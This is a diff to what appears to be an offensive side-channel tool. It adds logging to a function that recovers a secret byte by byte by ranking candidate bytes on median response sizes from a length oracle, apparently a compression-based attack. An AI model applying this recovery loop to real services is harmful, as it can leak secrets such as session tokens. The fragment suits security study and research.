@@ -1,5 +1,8 @@
+import logging
 import statistics
 from collections.abc import Iterable
+
+LOG = logging.getLogger("attacker.engine")
 
 ALIGNMENT_COUNT = 8
 
@@ -61,14 +64,25 @@ async def find_next_byte(
     candidates = [bytes([c]) for c in range(256)]
     samples: dict[bytes, list[int]] = {c: [] for c in candidates}
 
-    for _round in range(max_rounds):
+    for round_idx in range(max_rounds):
         for cand in candidates:
             for align_len in range(ALIGNMENT_COUNT):
                 size = await oracle(prefix, cand, align_len)
                 samples[cand].append(size)
 
         ranked = sorted(candidates, key=lambda c: statistics.median(samples[c]))
+        top_med = statistics.median(samples[ranked[0]])
+        runner_med = statistics.median(samples[ranked[1]])
+        agree = _alignment_agreement(ranked[0], samples)
+        LOG.info(
+            "byte=%d round=%d top=0x%02x med=%d runner=0x%02x med=%d margin=%d agree=%d/%d",
+            byte_index, round_idx + 1,
+            ranked[0][0], top_med,
+            ranked[1][0], runner_med,
+            runner_med - top_med, agree, ALIGNMENT_COUNT,
+        )
         if locked(ranked, samples, min_margin, min_agreement):
+            LOG.info("byte=%d locked at 0x%02x", byte_index, ranked[0][0])
             return ranked[0]
 
     raise RecoveryFailed(
